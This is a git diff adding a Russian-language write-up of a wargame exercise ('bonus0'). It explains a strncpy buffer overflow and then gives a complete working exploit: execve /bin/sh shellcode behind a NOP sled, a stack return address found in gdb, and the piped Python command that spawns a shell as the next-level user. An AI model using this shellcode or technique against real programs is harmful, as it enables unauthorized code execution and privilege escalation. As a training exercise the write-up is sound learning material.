@@ -1,0 +1,35 @@
+программа принимает на ввод две неограниченные строки и выводит их через пробел
+от каждой строки берется по 20 символов при помощи strncpy , но если 
+входящее значение ввода будет превышать 20 символов то первыя переменная не будет
+завешена символом \0 и в ходе дальнейших операций финальный массив в main будет содержать
+дважды повторенный второй ввод - получатеся что мы можем переполнить его, 
+отступ равен https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/
+Program received signal SIGSEGV, Segmentation fault.
+0x41336141 in ?? ()
+9, в первом вводе мы можем хранить весь код, тогда первый ввод:
+python -c 'print "\x90" * 100 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"'
+nopesled прежде всего для того чтобы его не затерло вторым вводом, шелкод взят из второго упражнения и
+имеет длинну в 45
+ #include <stdio.h>
+       main() {
+       char *name[2];
+       name[0] = "sh";
+       name[1] = NULL;
+       execve("/bin/sh",name,NULL);
+          }
+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"
+
+найдем адрес, где хранится содержимое строки считываемой функцией read в p
+b p
+r
+$ebp-0x1008
+0xbfffe640:	0x00000000
+
+можем выбрать для старта шелкода любой адрес с 0xbfffe640 до 0xbfffe640+100=0xbfffe6a4, 0xbfffe680
+второй ввод доведем до 20 символов, это важно для переполнения:
+python -c 'print "U" * 9 + "\x80\xe6\xff\xbf" + "U" * 7'
+кроме первых 20 символов, которые уже затерты вторым вводом: итак:
+
+(python -c 'print "\x90" * 100 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"'; python -c 'print "U" * 9 + "\x80\xe6\xff\xbf" + "U" * 7'; cat) | ./bonus0
+whoami
+bonus1
